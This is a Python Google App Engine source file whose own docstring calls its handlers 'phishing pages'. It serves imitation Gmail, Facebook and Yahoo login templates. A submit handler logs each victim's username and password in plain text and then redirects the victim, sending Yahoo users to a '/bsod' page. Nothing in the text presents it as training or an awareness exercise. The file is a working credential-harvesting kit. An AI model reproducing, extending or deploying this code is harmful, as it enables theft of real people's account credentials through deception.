import logging
import webapp2
import jinja2
import os
import uuid
import json

template_dir = os.path.join(os.path.dirname(__file__), 'templates/phishing')
jinja_environment = jinja2.Environment(
    loader=jinja2.FileSystemLoader(template_dir), autoescape=True)

from google.appengine.api import memcache
from google.appengine.ext import db
from google.appengine.api import users

from datetime import datetime
from collections import OrderedDict


"""

Has all the handlers required for the phishing pages

"""

class SubmitHandler(webapp2.RequestHandler):
	def post(self):
		user = str(self.request.get('user'))
		passwd = str(self.request.get('pass'))
		site = str(self.request.get('site'))
		logging.info("Site: {0}\nUser: {1}\nPass: {2}".format(site,user,passwd))
		if site == 'yahoo':
			self.redirect('/bsod')
		else:
			self.redirect(site)


class BaseHandler(webapp2.RequestHandler):
    def write(self, *a, **kw):
        self.response.out.write(*a,**kw)

    def render_str(self, template, params):
        t = jinja_environment.get_template(template)

        if self.adminCheck():
            params['admin'] = True;

        return t.render(params)

    def render(self, template, kw):
        self.write(self.render_str(template, kw))

    def adminCheck(self):
        user = users.get_current_user()
        if user:
            if users.is_current_user_admin():
                return True;
            else:
                return False
        else:
            return False

class GmailHandler(BaseHandler):
    def get(self):
        template_values = {}
        self.render('google.html',template_values)


class FacebookHandler(BaseHandler):
    def get(self):
        template_values = {}
        self.render('facebook.html',template_values)


class YahooHandler(BaseHandler):
    def get(self):
        template_values = {}
        self.render('yahoo.html',template_values)